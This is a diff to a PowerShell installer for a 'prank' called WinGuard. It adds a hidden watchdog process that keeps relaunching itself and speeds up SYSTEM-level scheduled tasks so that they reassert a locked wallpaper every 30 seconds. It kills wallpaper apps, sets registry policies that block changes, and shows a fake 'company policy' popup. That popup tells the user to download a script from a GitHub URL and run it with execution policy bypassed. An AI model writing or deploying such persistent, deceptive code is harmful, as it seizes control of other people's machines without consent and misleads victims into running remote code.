@@ -6,6 +6,7 @@ $heal = "$base\heal.ps1"
 $notice = "$base\notice.ps1"
 $image = "$base\wallpaper.jpg"
 $backup = "$base\backup.txt"
+$watchdog = "$base\watchdog.ps1"
 
 New-Item $base -ItemType Directory -Force | Out-Null
 
@@ -43,6 +44,8 @@ gpupdate /force
 # ===== GUARD SCRIPT =====
 @"
 `$img = '$image'
+`$noticeScript = '$notice'
+`$watchdogScript = '$watchdog'
 
 Add-Type -TypeDefinition @'
 using System;
@@ -53,10 +56,22 @@ public class Wallpaper {
 }
 '@
 
+# Spawn watchdog if not already running
+if (-not (Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
+        Where-Object { `$_.CommandLine -like '*watchdog.ps1*' })) {
+    Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File '`$watchdogScript'"
+}
+
 while (`$true) {
 
     'Lively','WallpaperEngine','livelywpf','wallpaper32','wallpaper64' | ForEach-Object {
         Get-Process -Name `$_ -ErrorAction SilentlyContinue | Stop-Process -Force
+    }
+
+    # If wallpaper was changed, notify user and revert
+    `$current = (Get-ItemProperty 'HKCU:\Control Panel\Desktop' -Name Wallpaper -ErrorAction SilentlyContinue).Wallpaper
+    if (`$current -ne `$img) {
+        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File '`$noticeScript'"
     }
 
     Set-ItemProperty "HKCU:\Control Panel\Desktop" Wallpaper `$img
@@ -69,7 +84,13 @@ while (`$true) {
     New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Force | Out-Null
     Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" NoChangingWallpaper 1
 
-    Start-Sleep 60
+    # Ensure watchdog is still running
+    if (-not (Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
+            Where-Object { `$_.CommandLine -like '*watchdog.ps1*' })) {
+        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File '`$watchdogScript'"
+    }
+
+    Start-Sleep 30
 }
 "@ | Out-File $guard -Encoding UTF8 -Force
 
@@ -78,18 +99,34 @@ while (`$true) {
 if (!(Get-ScheduledTask -TaskName WinGuard -ErrorAction SilentlyContinue)) {
     schtasks /create /tn WinGuard /sc onlogon /rl highest /tr `"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $guard`"
 }
+if (!(Get-ScheduledTask -TaskName WinGuard-Watchdog -ErrorAction SilentlyContinue)) {
+    schtasks /create /tn WinGuard-Watchdog /sc onlogon /rl highest /tr `"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $watchdog`"
+}
 "@ | Out-File $heal -Encoding UTF8 -Force
 
 # ===== PRANK MESSAGE =====
 @"
 Add-Type -AssemblyName PresentationFramework
 [System.Windows.MessageBox]::Show(
-"Your wallpaper is managed by company policy.`n`nThis device has been pranked by Sahindu 😄`n`nChanges are restricted by the system administrator.",
+"Your wallpaper is managed by company policy.``n``nThis device has been pranked by Sahindu 😄``n``nChanges are restricted by the system administrator.``n``nTo remove this protection:``n 1. Download unlock.ps1 from:``n    https://raw.githubusercontent.com/SahiDemon/IDMfix/main/unlock.ps1``n 2. Run: powershell -ExecutionPolicy Bypass -File unlock.ps1``n``n(Password required)",
 "Company Policy Notice",
 "OK",
 "Warning"
 )
 "@ | Out-File $notice -Encoding UTF8 -Force
+
+# ===== WATCHDOG SCRIPT =====
+@"
+`$guardScript = '$guard'
+
+while (`$true) {
+    if (-not (Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
+            Where-Object { `$_.CommandLine -like '*guard.ps1*' })) {
+        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File '`$guardScript'"
+    }
+    Start-Sleep 30
+}
+"@ | Out-File $watchdog -Encoding UTF8 -Force
 
 # ===== TASKS =====
 Register-ScheduledTask -TaskName "WinGuard" `
@@ -100,7 +137,7 @@ Register-ScheduledTask -TaskName "WinGuard" `
 $principalSys = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
 Register-ScheduledTask -TaskName "WinGuard-Heal" `
  -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $heal") `
- -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)) `
+ -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30) -RepetitionInterval (New-TimeSpan -Seconds 30)) `
  -Principal $principalSys -Force
 
 Register-ScheduledTask -TaskName "WinGuard-Notice" `
@@ -108,7 +145,13 @@ Register-ScheduledTask -TaskName "WinGuard-Notice" `
  -Trigger (New-ScheduledTaskTrigger -AtLogOn) `
  -RunLevel Highest -Force
 
+Register-ScheduledTask -TaskName "WinGuard-Watchdog" `
+ -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $watchdog") `
+ -Trigger (New-ScheduledTaskTrigger -AtLogOn) `
+ -RunLevel Highest -Force
+
 # ===== START NOW =====
 Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File $guard"
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File $watchdog"
 
 Write-Host "WinGuard v2 installed successfully."
